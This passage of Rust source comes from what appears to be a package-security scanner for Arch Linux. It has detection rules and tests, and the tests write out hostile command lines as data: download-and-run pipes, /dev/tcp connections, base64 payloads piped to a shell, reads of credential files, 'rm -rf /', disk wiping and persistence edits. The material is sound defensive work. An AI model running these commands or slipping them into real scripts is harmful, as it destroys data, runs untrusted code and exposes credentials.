                "a", "i", "d", "r", "c", "j", "g", "--append", "--insert", "--delete",
                "--replace", "--check", "--jump", "--goto",
            ],
        )
        || line.contains("iptables --flush")
        || line.contains("ip6tables --flush");
    let selinux = line.contains("setenforce 0") || line.contains("setenforce  0");
    let ptrace = line.replace(' ', "").contains("kernel.yama.ptrace_scope=0");
    // Taking Guardian itself out of the way.
    let removes_guardian = (line.contains("pacman -r") || line.contains("pacman --remove"))
        && line.contains("omarchy-guardian");
    let removes_hook = line.contains("/etc/pacman.d/hooks/omarchy-guardian")
        && (line.contains("rm ") || line.contains("unlink") || line.contains("mv "));
    let disarms_makepkg =
        line.contains("--makepkg") && line.contains("makepkg") && line.contains("--save");
    systemctl
        || ufw_off
        || flush
        || selinux
        || ptrace
        || removes_guardian
        || removes_hook
        || disarms_makepkg
}

/// Erasing the record of what ran.
fn removes_traces(line: &str) -> bool {
    let history = line.contains("history -c")
        || line.replace(' ', "").contains("histfile=/dev/null")
        || line.contains("set +o history")
        || line.contains("unset histfile");
    let journal = line.contains("journalctl")
        && (line.contains("--vacuum") || line.contains("--rotate") || line.contains("--flush"));
    // Wiping the system logs themselves.
    let logs = ["/var/log/", "/var/log "]
        .iter()
        .any(|path| line.contains(path))
        && [
            "rm ",
            "rm -",
            "shred",
            "truncate",
            ": >",
            ":>",
            "> /var/log",
            ">/var/log",
        ]
        .iter()
        .any(|verb| line.contains(verb));
    history || journal || logs
}

/// Names of prose files, matched as a prefix followed by the end of the name
/// or `.`, `-` or `_`: `LICENSE`, `LICENSE.txt`, `COPYING.LESSER`,
/// `eula_text.html`.
const PROSE_NAMES: &[&str] = &[
    "readme",
    "license",
    "licence",
    "copying",
    "changelog",
    "authors",
    "notice",
    "eula",
    "terms",
];

/// Prose files are sent to the AI review but not matched by the local
/// command rules, where install instructions (`sudo pacman -S ...`) and
/// examples would otherwise block every project with a README.
pub fn is_documentation(rel: &str) -> bool {
    let path = Path::new(rel);
    let name = path
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or_default()
        .to_ascii_lowercase();
    let extension = path
        .extension()
        .and_then(|extension| extension.to_str())
        .unwrap_or_default()
        .to_ascii_lowercase();

    if matches!(
        extension.as_str(),
        "md" | "markdown" | "rst" | "adoc" | "asciidoc" | "org" | "changelog"
    ) {
        return true;
    }

    // License texts: by name, or anywhere under a REUSE-style `LICENSES/`.
    let prose_name = PROSE_NAMES.iter().any(|prose| {
        name.strip_prefix(prose)
            .is_some_and(|rest| rest.is_empty() || rest.starts_with(['.', '-', '_']))
    });
    let in_licenses = path.parent().is_some_and(|parent| {
        parent.components().any(|component| {
            component.as_os_str().to_str().is_some_and(|name| {
                matches!(name.to_ascii_lowercase().as_str(), "licenses" | "licences")
            })
        })
    });
    // A script or config named like a license still runs.
    let prose_extension =
        matches!(extension.as_str(), "html" | "htm") || !is_executable_or_runtime_config(rel);
    (prose_name || in_licenses) && prose_extension
}

/// Files whose URLs are likely to be requested when the software runs.
pub fn is_executable_or_runtime_config(rel: &str) -> bool {
    let path = Path::new(rel);
    let name = path
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or_default()
        .to_ascii_lowercase();
    let extension = path
        .extension()
        .and_then(|extension| extension.to_str())
        .unwrap_or_default()
        .to_ascii_lowercase();

    matches!(
        extension.as_str(),
        "bash"
            | "bat"
            | "c"
            | "cc"
            | "cmd"
            | "cpp"
            | "cs"
            | "cjs"
            | "conf"
            | "css"
            | "desktop"
            | "ex"
            | "exs"
            | "fish"
            | "go"
            | "h"
            | "html"
            | "hpp"
            | "ini"
            | "java"
            | "json"
            | "js"
            | "jsx"
            | "kt"
            | "lua"
            | "mjs"
            | "php"
            | "pl"
            | "ps1"
            | "py"
            | "pyw"
            | "rb"
            | "rs"
            | "scala"
            | "sc"
            | "service"
            | "sh"
            | "svg"
            | "swift"
            | "toml"
            | "ts"
            | "tsx"
            | "xml"
            | "yaml"
            | "yml"
    ) || matches!(
        name.as_str(),
        "dockerfile"
            | "makefile"
            | "pkgbuild"
            | ".install"
            | ".bashrc"
            | ".zshrc"
            | ".profile"
            | ".bash_profile"
            | ".zprofile"
            | ".xprofile"
            | "package.json"
    )
}

/// Whether a relative path looks like it holds credentials. The check uses
/// the path inside the reviewed tree, so where the tree itself lives (for
/// example under `~/secrets/`) does not matter.
pub fn is_sensitive_path(rel: &str) -> bool {
    let lower = rel.to_lowercase();
    let name = lower.rsplit('/').next().unwrap_or_default();

    lower.split('/').any(|component| {
        matches!(
            component,
            ".ssh" | ".aws" | ".gnupg" | "credentials" | "secrets"
        )
    }) || name.starts_with(".env.")
        || name.starts_with(".env_")
        || ["secret", "credential"]
            .iter()
            .any(|word| name.contains(word))
        || name
            .split(|character: char| !character.is_ascii_alphanumeric())
            .any(|word| word == "token" || word == "tokens")
        || [
            ".pem",
            ".key",
            ".p12",
            ".pfx",
            ".keystore",
            ".jks",
            ".kdbx",
            ".tfstate",
            ".tfvars",
            ".tfvars.json",
            // `.env` itself and `prod.env`.
            ".env",
        ]
        .iter()
        .any(|extension| name.ends_with(extension))
        // Files that hold a login by their purpose. `.npmrc` and `.envrc`
        // are not among them: projects ship those as plain settings, and
        // withholding one makes a review incomplete.
        || matches!(
            name,
            ".pypirc" | ".netrc" | "id_rsa" | "id_ed25519" | "id_ecdsa" | "id_dsa"
        )
        || lower.ends_with(".kube/config")
        || lower.ends_with(".docker/config.json")
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum Scheme {
    Http,
    Https,
}

impl Scheme {
    pub const fn as_str(self) -> &'static str {
        match self {
            Self::Http => "http",
            Self::Https => "https",
        }
    }
}

/// Literal HTTP(S) destinations in a line, reduced to scheme and host so
/// paths, queries and credentials in URLs are never echoed.
pub fn extract_network_destinations(line: &str) -> Vec<(Scheme, String)> {
    let mut result: Vec<(Scheme, String)> = destinations_with_path(line)
        .into_iter()
        .map(|(scheme, host, _)| (scheme, host))
        .collect();
    result.sort();
    result.dedup();
    result
}

/// How a host read from a URL is classified, kept apart so the path that
/// decides it is used but never stored (see `Report::network`).
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct HostConcern {
    /// A host made to read as another name (mixed scripts, a well-known
    /// host's name in front of another domain).
    pub lookalike: bool,
    /// A host commonly used to drop off or pick up stolen data.
    pub drop: bool,
}

/// Each literal HTTP(S) destination's host classified by the concerns its
/// name and path raise, with the path itself discarded.
pub fn host_concerns(line: &str) -> Vec<(String, HostConcern)> {
    destinations_with_path(line)
        .into_iter()
        .filter_map(|(_, host, path)| {
            let concern = HostConcern {
                lookalike: reads_as_another_host(&host),
                drop: hosts::is_drop_destination(&host, &path),
            };
            (concern.lookalike || concern.drop).then_some((host, concern))
        })
        .collect()
}

/// A host named to be taken for another: by its letters (see
/// `hidden::is_lookalike_host`), or by beginning with a well-known code
/// host's name while belonging to another domain.
fn reads_as_another_host(host: &str) -> bool {
    hidden::is_lookalike_host(host) || hosts::embeds_code_host(host)
}

/// Whether `code` names a host made to read as another that `quiet` does
/// not show: one in a recipe's `source=` or `url=`, which are declarations
/// and so no network requests of the recipe's own. Cleartext and bare
/// addresses there are makepkg's to fetch and check, but a source host
/// that passes for a forge is the typosquat itself.
pub fn declares_lookalike_host(code: &str, quiet: &str) -> bool {
    if code == quiet {
        return false;
    }
    let requested: Vec<String> = destinations_with_path(quiet)
        .into_iter()
        .map(|(_, host, _)| host)
        .collect();
    destinations_with_path(code)
        .into_iter()
        .any(|(_, host, _)| {
            !requested.contains(&host) && !is_local_host(&host) && reads_as_another_host(&host)
        })
}

/// The literal HTTP(S) destinations of a line as `(scheme, host, path)`.
/// The path (lowercased, query and fragment dropped) is for classification
/// only and is never recorded.
fn destinations_with_path(line: &str) -> Vec<(Scheme, String, String)> {
    let lower = line.to_ascii_lowercase();
    let mut result = Vec::new();
    let mut cursor = 0;
    // A DTD reference names a vocabulary; nothing requests it.
    let doctype = lower.contains("<!doctype");

    while cursor < lower.len() {
        // One search per candidate: finding each prefix separately rescans
        // the rest of the line for the absent one every time, which is
        // quadratic on a line of many `http://` URLs.
        let Some(offset) = lower[cursor..].find("http") else {
            break;
        };
        let candidate = &lower[cursor + offset..];
        let Some((prefix, scheme)) = [("https://", Scheme::Https), ("http://", Scheme::Http)]
            .into_iter()
            .find(|(prefix, _)| candidate.starts_with(prefix))
        else {
            cursor += offset + "http".len();
            continue;
        };

        let start = cursor + offset;
        let rest = &lower[start..];
        let end = rest
            .char_indices()
            .find_map(|(index, character)| {
                (character.is_whitespace()
                    || matches!(
                        character,
                        '"' | '\'' | '`' | '<' | '>' | ')' | ']' | '}' | ',' | ';'
                    ))
                .then_some(index)
            })
            .unwrap_or(rest.len());
        let url = rest[..end]
            .get(..512)
            .unwrap_or(&rest[..end])
            .trim_end_matches(['.', ':', '?', '!', '\\']);

        let after_scheme = &url[prefix.len().min(url.len())..];
        if let Some(host) = url_host(after_scheme)
            && !doctype
            && !Path::new(url)
                .extension()
                .is_some_and(|extension| extension == "dtd" || extension == "xsd")
            && !is_identifier_uri(&lower[..start])
        {
            // The path is what follows the authority, up to a query or
            // fragment: `/api/webhooks` of `host/api/webhooks?x=1`.
            let path = after_scheme
                .find('/')
                .map(|at| &after_scheme[at..])
                .unwrap_or_default()
                .split(['?', '#'])
                .next()
                .unwrap_or_default()
                .to_string();
            result.push((scheme, host, path));
        }
        cursor = start + end.max(prefix.len());
    }

    result
}

/// XML namespace and RDF URIs name a vocabulary; nothing requests them.
/// `before` is the lowercased text preceding the URL on its line.
fn is_identifier_uri(before: &str) -> bool {
    let Some(before) = before.strip_suffix(['"', '\'']) else {
        return false;
    };
    let Some(attribute) = before.trim_end().strip_suffix('=') else {
        return false;
    };
    let attribute = attribute
        .trim_end()
        .rsplit(|character: char| character.is_whitespace() || character == '<')
        .next()
        .unwrap_or_default();
    attribute == "xmlns"
        || attribute.starts_with("xmlns:")
        || matches!(
            attribute,
            "rdf:resource" | "rdf:about" | "xsi:schemalocation" | "xsi:nonamespaceschemalocation"
        )
}

fn url_host(after_scheme: &str) -> Option<String> {
    let authority = after_scheme
        .split(['/', '?', '#'])
        .next()
        .unwrap_or_default();
    let authority = authority.rsplit('@').next().unwrap_or_default();
    let host = if authority.starts_with('[') {
        authority
            .split_once(']')
            .map_or(authority, |(address, _)| address)
            .to_string()
            + "]"
    } else {
        authority.split(':').next().unwrap_or_default().to_string()
    };
    (!host.is_empty() && host != "]").then_some(host)
}

pub fn is_local_host(host: &str) -> bool {
    matches!(host, "localhost" | "127.0.0.1" | "::1" | "[::1]") || host.ends_with(".localhost")
}

pub fn is_ip_host(host: &str) -> bool {
    host.trim_start_matches('[')
        .trim_end_matches(']')
        .parse::<IpAddr>()
        .is_ok()
}

#[cfg(test)]
mod tests {
    use super::{
        RuleId, Scheme, extract_network_destinations, is_documentation, is_download_piped_to_shell,
        is_encoded_data_executed, is_ip_host, is_sensitive_path, line_rules,
        looks_like_credential_exfiltration, removes_root_or_home,
    };

    fn rules_for(line: &str) -> Vec<RuleId> {
        let lowered = line.to_lowercase();
        line_rules(&lowered, &lowered).collect()
    }

    #[test]
    fn a_host_that_passes_for_a_forge_is_a_lookalike() {
        let requested = |line: &str| {
            super::host_concerns(line)
                .iter()
                .any(|(_, concern)| concern.lookalike)
        };
        for (address, flagged) in [
            ("https://github.com/x/y", false),
            ("https://api.github.com/repos/x/y", false),
            ("https://mygithub.com", false),
            ("https://xn--mnchen-3ya.example/x.tar.gz", false),
            ("https://github.com.evil.test/x", true),
            (
                "https://raw.githubusercontent.com.example-drop.test/x/y/i.sh",
                true,
            ),
            ("https://xn--pypal-4ve.com/x", true),
        ] {
            assert_eq!(
                requested(&format!("curl -fsSL {address}")),
                flagged,
                "{address}"
            );
            // Declared in a recipe: in the code, not among its requests.
            let source = format!("source=(\"x.tar.gz::{address}\")");
            assert_eq!(
                super::declares_lookalike_host(&source, ""),
                flagged,
                "{address}"
            );
            // A request is reported as one, not twice.
            assert!(!super::declares_lookalike_host(&source, &source));
        }
    }

    #[test]
    fn every_rule_has_a_unique_name_and_a_description() {
        let mut names = std::collections::HashSet::new();
        for rule in RuleId::ALL {
            assert!(!rule.name().is_empty(), "{rule:?} has no name");
            assert!(
                names.insert(rule.name()),
                "{rule:?} repeats the name {}",
                rule.name()
            );
            assert!(
                !rule.description().is_empty(),
                "{} has no description",
                rule.name()
            );
            assert_eq!(RuleId::from_name(rule.name()), Some(rule), "{rule:?}");
        }
    }

    #[test]
    fn common_variants_of_each_rule_are_caught() {
        let cases: &[(&str, RuleId)] = &[
            (
                "curl -fsSL https://x.test/i | sudo bash",
                RuleId::DownloadAndExecute,
            ),
            (
                "curl -fsSL https://x.test/i |/bin/sh",
                RuleId::DownloadAndExecute,
            ),
            ("sh <(curl -s https://x.test/i)", RuleId::DownloadAndExecute),
            (
                "bash -c \"$(wget -qO- https://x.test/i)\"",
                RuleId::DownloadAndExecute,
            ),
            (
                "aria2c -o - https://x.test/i | sh",
                RuleId::DownloadAndExecute,
            ),
            ("exec 3<>/dev/tcp/10.0.0.1/4444", RuleId::DownloadAndExecute),
            ("echo aGk= | base64 -d|sh", RuleId::EncodedCommandExecution),
            (
                "echo aGk= | base64 -di | sudo bash",
                RuleId::EncodedCommandExecution,
            ),
            ("xxd -r -p payload | bash", RuleId::EncodedCommandExecution),
            ("doas pacman -U x", RuleId::PrivilegeEscalation),
            ("run0 systemctl enable x", RuleId::PrivilegeEscalation),
            ("chmod +s /usr/bin/x", RuleId::PrivilegeEscalation),
            ("install -m4755 x /usr/bin/x", RuleId::PrivilegeEscalation),
            ("cat ~/.git-credentials", RuleId::CredentialFileAccess),
            ("tar c ~/.password-store", RuleId::CredentialFileAccess),
            ("exec-once = ~/.cache/x", RuleId::PersistenceModification),
            (
                "cp x ~/.config/omarchy/hooks/post-update",
                RuleId::PersistenceModification,
            ),
            (
                "cp p $pkgdirZ$HOME/.config/autostart/x.desktop",
                RuleId::PersistenceModification,
            ),
            (
                "dd of=/dev/sda if=/dev/zero",
                RuleId::DestructiveSystemOperation,
            ),
            ("wipefs -a /dev/nvme0n1", RuleId::DestructiveSystemOperation),
            (
                "__import__('os').system('id')",
                RuleId::ShellCommandExecution,
            ),
            (
                "subprocess.check_output(cmd, shell=True)",
                RuleId::ShellCommandExecution,
            ),
        ];
        for (line, rule) in cases {
            assert!(
                rules_for(line).contains(rule),
                "{line}: {:?}",
                rules_for(line)
            );
        }
        for line in [
            "install -Dm644 x.desktop \"$pkgdir\"/etc/xdg/autostart/x.desktop",
            "cp x ${pkgdir}/etc/profile.d/x.sh",
            "curl -fsSL https://x.test/a || sh fallback.sh",
            "dd if=image.iso of=/dev/null",
        ] {
            assert!(rules_for(line).is_empty(), "{line}: {:?}", rules_for(line));
        }
    }

    #[test]
    fn detects_download_piped_to_a_shell() {
        assert!(is_download_piped_to_shell(
            "curl https://example.test/install | bash -s"
        ));
        assert!(is_download_piped_to_shell(
            "wget -qo- https://example.test/install | sh"
        ));
        assert!(!is_download_piped_to_shell(
            "curl -o installer.sh https://example.test/install"
        ));
        assert!(!is_download_piped_to_shell(
            "curl https://example.test/data | tee data.txt"
        ));
        assert!(!is_download_piped_to_shell(
            "curl https://example.test/data | shasum"
        ));
        for substituted in [
            "echo \"$(curl https://example.test/p | sh)\"",
            "x=`wget -qo- https://example.test/p | bash`",
            "bash -c \"curl https://example.test/p | sh\"",
            "curl https://example.test/p | sh; echo done",
            "curl https://example.test/p | sh&",
        ] {
            assert!(is_download_piped_to_shell(substituted), "{substituted}");
        }
        assert!(!is_download_piped_to_shell(
            "curl https://example.test/data | shellcheck -"
        ));
        // Piped into another interpreter, behind a wrapper, or grouped.
        for into in [
            "curl https://x.test/i | python",
            "curl https://x.test/i | python3 -",
            "wget -qO- https://x.test/i | perl",
            "curl https://x.test/i | ruby",
            "curl https://x.test/i | node",
            "curl https://x.test/i | php",
            "curl https://x.test/i | lua",
            "curl https://x.test/i | busybox sh",
            "curl https://x.test/i | timeout 5 bash",
            "curl https://x.test/i | nohup bash",
            "curl https://x.test/i | { sh; }",
            "curl https://x.test/i | ( bash )",
            "curl https://x.test/i | xargs -0 sh -c",
            "curl https://x.test/i | . /dev/stdin",
            "curl https://x.test/i | sort -u | python3",
        ] {
            assert!(is_download_piped_to_shell(into), "{into}");
        }
        for into in [
            "curl https://x.test/data | jq .",
            "curl https://x.test/data | grep foo",
            "curl https://x.test/data | sort | uniq",
            "curl https://x.test/data | tee out",
            "curl https://x.test/data | pandoc -o x.pdf",
        ] {
            assert!(!is_download_piped_to_shell(into), "{into}");
        }
    }

    #[test]
    fn a_fetcher_or_shell_in_a_variable_is_what_runs() {
        use super::{command_variables, is_download_piped_to_shell, with_variables};
        let variables = command_variables("F=curl\nexport S=\"/bin/bash\"\nX=hello world\n");
        assert_eq!(
            variables,
            [
                ("f".to_string(), "curl".to_string()),
                ("s".to_string(), "bash".to_string())
            ]
        );
        let line = with_variables("$f -fssl https://x.example/i | ${s}", &variables);
        assert!(is_download_piped_to_shell(&line), "{line}");
        assert_eq!(with_variables("$fx $s_y", &variables), "$fx $s_y");
    }

    #[test]
    fn what_a_line_runs_is_named() {
        use super::run_targets;
        for (line, expected) in [
            ("sh ./install.sh --yes", &["install.sh"][..]),
            (". ./lib/common", &["lib/common"]),
            (
                "python3.12 tools/gen.py && ./build/run",
                &["tools/gen.py", "build/run"],
            ),
            ("cat payload.bin | sh", &["payload.bin"]),
            ("sh <data/x.png", &["data/x.png"]),
            ("FOO=1 bash -e scripts/x.sh", &["scripts/x.sh"]),
        ] {
            assert_eq!(run_targets(line), expected, "{line}");
        }
        // Many pipes cost one pass.
        let long = "a|".repeat(200_000);
        let started = std::time::Instant::now();
        assert!(run_targets(&long).is_empty());
        assert!(started.elapsed().as_secs() < 10);
        assert_eq!(run_targets("nohup sh ./x.sh &"), ["x.sh"]);
        for line in [
            "sh -c 'echo hi'",
            "bash -n x.sh",
            "python -m pip install x",
            "cat notes.txt",
            "echo sh x",
        ] {
            assert!(run_targets(line).is_empty(), "{line}");
        }
    }

    #[test]
    fn a_download_saved_to_a_file_is_followed_to_where_it_runs() {
        use super::{continues, fetched_file, runs_file};
        for (line, file) in [
            (
                "curl -fssl https://x.example/i.sh -o /tmp/i.sh",
                "/tmp/i.sh",
            ),
            ("curl https://x.example/i.sh > ./i.sh", "i.sh"),
            ("curl https://x.example/i.sh >i.sh", "i.sh"),
            ("curl -O https://x.example/a/i.sh?x=1", "i.sh"),
            ("sudo wget -q https://x.example/a/i.sh", "i.sh"),
            ("wget -O \"$tmp\" https://x.example/a/i.sh", "$tmp"),
            ("wget -o fetch.log https://x.example/a/i.sh", "i.sh"),
            ("aria2c --out=i.sh https://x.example/a", "i.sh"),
        ] {
            assert_eq!(fetched_file(line).as_deref(), Some(file), "{line}");
        }
        assert_eq!(fetched_file("curl https://x.example/i.sh"), None);
        assert_eq!(fetched_file("wget -qO- https://x.example/i.sh"), None);
        assert_eq!(fetched_file("wget -O- https://x.example/i.sh"), None);
        assert_eq!(fetched_file("wget -O - https://x.example/i.sh"), None);
        for line in [
            "wget -qO- https://x.example/i.sh > i.sh",
            "wget -q https://x.example/i.sh -O - >> i.sh",
            "wget --output-document=- https://x.example/i.sh >i.sh",
            "curl -o - https://x.example/i.sh > i.sh",
        ] {
            assert_eq!(fetched_file(line).as_deref(), Some("i.sh"), "{line}");
        }
        assert_eq!(fetched_file("echo saved > out.txt"), None);

        for line in [
            "sh i.sh",
            "sudo bash ./i.sh --yes",
            ". i.sh",
            "chmod +x i.sh && ./i.sh",
            "if true; then python3 i.sh; fi",
        ] {
            assert!(runs_file(line, "i.sh"), "{line}");
        }
        assert!(runs_file("bash i.sh -n", "i.sh"));
        assert!(!runs_file("bash -n i.sh", "i.sh"));
        assert!(runs_file("perl -n i.sh", "i.sh"));
        assert!(runs_file("bash -m i.sh", "i.sh"));
        assert!(runs_file("bash \"$tmp\"", "$tmp"));
        assert!(runs_file("\"$tmp\" --install", "$tmp"));
        for line in [
            "cat i.sh",
            "chmod +x i.sh",
            "sh other.sh",
            "echo sh i.sh > log",
        ] {
            assert!(!runs_file(line, "i.sh"), "{line}");
        }

        assert!(continues("curl https://x.example/i.sh \\", "  | sh"));
        assert!(continues("curl https://x.example/i.sh |", "sh"));
        assert!(continues("curl https://x.example/i.sh", "  | sh"));
        assert!(!continues("curl https://x.example/i.sh", "sh i.sh"));
    }

    #[test]
    fn a_run_behind_a_wrapper_an_assignment_or_a_group_is_still_a_run() {
        use super::{run_targets, runs_file};
        for line in [
            "nohup sh i.sh",
            "FOO=1 bash i.sh",
            "time sh i.sh",
            "setsid bash i.sh",
            "! sh i.sh",
            "chmod +x i.sh; nohup ./i.sh &",
            "timeout 5 sh i.sh",
            "timeout --signal=9 10 ./i.sh",
            "( sh i.sh )",
            "(sh i.sh)",
            "{ sh ./i.sh; }",
            "sudo -u x sh i.sh",
            "if sh i.sh; then",
            "while ! ./i.sh; do",
            "exec = sh i.sh",
            "exec-once = sh i.sh",
        ] {
            assert!(runs_file(line, "i.sh"), "{line}");
            assert_eq!(
                run_targets(line).first().map(String::as_str),
                Some("i.sh"),
                "{line}"
            );
        }
        for line in [
            "nohup cat i.sh",
            "FOO=i.sh",
            "X=sh echo i.sh",
            "timeout 5 cat i.sh",
            "( cat i.sh )",
            "sudo -u sh cat i.sh",
            "if [ -f i.sh ]; then",
            "time bash -n i.sh",
            "exec = cat i.sh",
            "name = i.sh",
        ] {
            assert!(!runs_file(line, "i.sh"), "{line}");
            assert!(run_targets(line).is_empty(), "{line}");
        }
        // A name that ends in a `)` of its own keeps it.
        // A name that ends in a `)` may be a file's own or a group's close,
        // on this line or one before: both names are given.
        assert_eq!(run_targets("./'blob)'"), ["blob", "blob)"]);
        assert_eq!(run_targets("sh 'blob)'"), ["blob", "blob)"]);
        assert_eq!(
            run_targets("  ./configure && ./i.sh)"),
            ["configure", "i.sh", "i.sh)"]
        );
        assert!(runs_file("curl -o ')' https://x.example/a; sh ')'", ")"));
        // A setting whose value begins with a path is read as a command too.
        assert!(runs_file("ExecStart=/bin/sh i.sh", "i.sh"));
        for unit in [
            "ExecStart=-/bin/sh i.sh",
            "ExecStartPre=+/bin/sh i.sh",
            "ExecStart=!!/bin/sh i.sh",
            "ExecStartPost=-+/bin/bash i.sh",
        ] {
            assert!(runs_file(unit, "i.sh"), "{unit}");
        }
        assert!(runs_file("FOO=/bin/sh i.sh", "i.sh"));
        assert!(!runs_file("FOO=/bin/cat i.sh", "i.sh"));
    }

    #[test]
    fn encoded_data_is_only_flagged_when_it_is_executed() {
        assert!(is_encoded_data_executed("exec(base64.b64decode(payload))"));
        assert!(!is_encoded_data_executed(
            "payload = base64.b64decode(encoded_data)"
        ));
    }

    #[test]
    fn recursive_removal_only_matches_root_or_home_itself() {
        for dangerous in [
            "rm -rf /",
            "sudo rm -rf / ",
            "rm -rf /*",
            "rm -fr ~/",
            "rm -r --no-preserve-root /",
            "rm -rf \"$home\"",
            "rm -rf ${home}/*",
            "/usr/bin/rm -rf ~",
            "rm / -rf",
        ] {
            assert!(removes_root_or_home(dangerous), "missed {dangerous:?}");
        }
        for ordinary in [
            "rm -rf /tmp/build",
            "rm -rf /usr/share/foo",
            "rm -rf \"$pkgdir\"",
            "rm -rf ~/.cache/thing",
            "rm -f /",
            "rm -rf build; ls /",
            "echo rm -rf",
        ] {
            assert!(!removes_root_or_home(ordinary), "flagged {ordinary:?}");
        }
    }

    #[test]
    fn sandbox_helper_setuid_is_expected_packaging() {
        for packaging in [
            "chmod 4755 \"${pkgdir}\"/opt/1password/chrome-sandbox",
            "chmod 4755 \"$pkgdir/opt/brave-bin/chrome-sandbox\";",
            "chmod 4755 '/opt/obsidian/chrome-sandbox' || true",
            "chmod u+s chrome-sandbox",
            "chmod 4755 \"${pkgdir}/opt/grok bot/chrome-sandbox\"",
            "chmod 4755 \"${pkgdir}/opt/microsoft/msedge/msedge-sandbox\"",
            "chmod 4755 \"$pkgdir/usr/lib/opera-gx/opera_sandbox\"",
            "chown root \"$pkgdir/usr/lib/chromium/chrome-sandbox\"",
        ] {
            assert!(
                !rules_for(packaging).contains(&RuleId::PrivilegeEscalation),
                "{packaging}"
            );
        }
        for escalation in [
            "chmod 4755 /opt/x/chrome-sandbox && sudo id",
            "chmod 4755 /opt/x/chrome-sandbox /usr/bin/bash",
            "chmod 4755 /opt/x/chrome-sandbox-helper",
            "chmod 4755 /opt/x/chrome-sandbox; chmod u+s /usr/bin/bash",
            "chmod u+s /usr/bin/bash",
            "chown root /usr/bin/x",
        ] {
            assert!(
                rules_for(escalation).contains(&RuleId::PrivilegeEscalation),
                "{escalation}"
            );
        }
    }

    #[test]
    fn packaging_a_mkfs_program_is_not_running_it() {
        for packaging in [
            "install -dm755 \"$srcdir/docker-sbx/mkfs.erofs\" \\",
            "\"$pkgdir/usr/lib/${pkgname}/libexec/mkfs.erofs\"",
            "sudo install -m755 mkfs.x /usr/bin/",
            "ln -s mkfs.ext4 \"$pkgdir/usr/bin/mkfs.ext3\"",
        ] {
            assert!(
                !rules_for(packaging).contains(&RuleId::DestructiveSystemOperation),
                "{packaging}"
            );
        }
        for running in [
            "mkfs.ext4 /dev/sda",
            "sudo mkfs.vfat -f32 \"$dev\"",
            "os.system(\"mkfs.ext4 /dev/sda\")",
            "install x mkfs.y; mkfs.ext4 /dev/sda",
            "x=$(mkfs.btrfs -f /dev/sdb)",
            // The word a wrapper's option takes is not the program.
            "env -u install mkfs.ext4 /dev/sda",
            "exec -a rm mkfs.btrfs -f /dev/nvme0n1",
            "run0 --unit install mkfs.ext4 /dev/sda",
            "sudo -u install mkfs.ext4 /dev/sda",
        ] {
            assert!(
                rules_for(running).contains(&RuleId::DestructiveSystemOperation),
                "{running}"
            );
        }
    }

    #[test]
    fn packaged_startup_files_are_not_persistence() {
        for packaging in [
            "install -dm644 x.sh \"${pkgdir}/etc/profile.d/x.sh\"",
            "} >>\"${pkgdir}/etc/profile.d/x.sh\"",
            "\"$pkgdir\"/etc/cron.daily/ \\",
            "install -d -m644 x.timer \"$pkgdir/etc/systemd/system/x.timer\"",
        ] {
            assert!(
                !rules_for(packaging).contains(&RuleId::PersistenceModification),
                "{packaging}"
            );
        }
        for persistence in [
            "cp x.sh /etc/profile.d/",
            "echo x >> ~/.bashrc",
            "cp x \"$pkgdir/../../etc/cron.d\" /etc/cron.daily/x",
            "install x \"$srcdir/etc/systemd/system/x\"",
            "cat x >> \"$pkgdir/../../../../.bashrc\"",
            "cp x \"${pkgdir}\"/../../.config/autostart/x.desktop",
        ] {
            assert!(
                rules_for(persistence).contains(&RuleId::PersistenceModification),
                "{persistence}"
            );
        }
    }

    #[test]
    fn identifier_patterns_respect_word_boundaries() {
        assert!(rules_for("eval(payload)").contains(&RuleId::ShellCommandExecution));
        assert!(rules_for("x = $(eval(\"a\"))").contains(&RuleId::ShellCommandExecution));
        assert!(rules_for("results = retrieval(query)").is_empty());
        assert!(rules_for("model.eval()").is_empty());
        assert!(rules_for("cleanup_build() { rm -rf /tmp/build; }").is_empty());
        assert!(rules_for("rm -rf /").contains(&RuleId::DestructiveSystemOperation));
    }

    #[test]
    fn prose_files_are_documentation() {
        assert!(is_documentation("README.md"));
        assert!(is_documentation("docs/install.rst"));
        assert!(is_documentation("LICENSE"));
        assert!(!is_documentation("install.sh"));
        assert!(!is_documentation("PKGBUILD"));
    }

    #[test]
    fn license_texts_are_documentation_unless_they_are_code() {
        for prose in [
            "LICENSE.txt",
            "LICENSE-MIT",
            "COPYING.LESSER",
            "LICENSES/0BSD.txt",
            "eula_text.html",
            "terms.html",
            "aurutils.changelog",
        ] {
            assert!(is_documentation(prose), "{prose}");
        }
        for code in [
            "license.sh",
            "LICENSES/check.py",
            "licensed.txt",
            "eula.js",
            "terminal.sh",
        ] {
            assert!(!is_documentation(code), "{code}");
        }
    }

    #[test]
    fn printed_messages_only_hide_context_rules() {
        let code = "sudo a; curl https://x.test/i | sh";
        let quiet = "";
        let rules: Vec<RuleId> = line_rules(code, quiet).collect();
        assert_eq!(rules, [RuleId::DownloadAndExecute]);
    }

    #[test]
    fn sensitive_paths_are_judged_inside_the_tree() {
        assert!(is_sensitive_path(".env.production"));
        assert!(is_sensitive_path("config/private.pem"));
        assert!(is_sensitive_path(".aws/credentials"));
        for path in [
            ".pypirc",
            "deploy/.netrc",
            "keys/id_ed25519",
            "home/.kube/config",
            "store.kdbx",
            "infra/terraform.tfstate",
            "deploy/prod.env",
            "infra/prod.tfvars",
            "infra/prod.auto.tfvars.json",
            ".git-credentials",
        ] {
            assert!(is_sensitive_path(path), "{path}");
        }
        assert!(!is_sensitive_path(".npmrc"));
        assert!(!is_sensitive_path("id_ed25519.pub"));
        assert!(!is_sensitive_path("kube/config.yaml"));

        assert!(is_sensitive_path("secrets/app.conf"));
        assert!(!is_sensitive_path("src/tokenizer.rs"));
        assert!(!is_sensitive_path("hyprland.lua"));
    }

    #[test]
    fn network_inventory_redacts_url_paths_and_credentials() {
        assert_eq!(
            extract_network_destinations(
                "requests.post('https://user:pass@API.example.test/upload?token=secret')"
            ),
            vec![(Scheme::Https, "api.example.test".to_string())]
        );
        assert_eq!(
            extract_network_destinations("fetch(\"http://[2001:db8::1]:8080/x\") http://a.test"),
            vec![
                (Scheme::Http, "[2001:db8::1]".to_string()),
                (Scheme::Http, "a.test".to_string()),
            ]
        );
        assert!(extract_network_destinations("see https:// for details").is_empty());
        assert_eq!(
            extract_network_destinations("httpx http:/ HTTPS://b.test http://a.test"),
            vec![
                (Scheme::Http, "a.test".to_string()),
                (Scheme::Https, "b.test".to_string()),
            ]
        );
        let many = "http://a ".repeat(250_000);
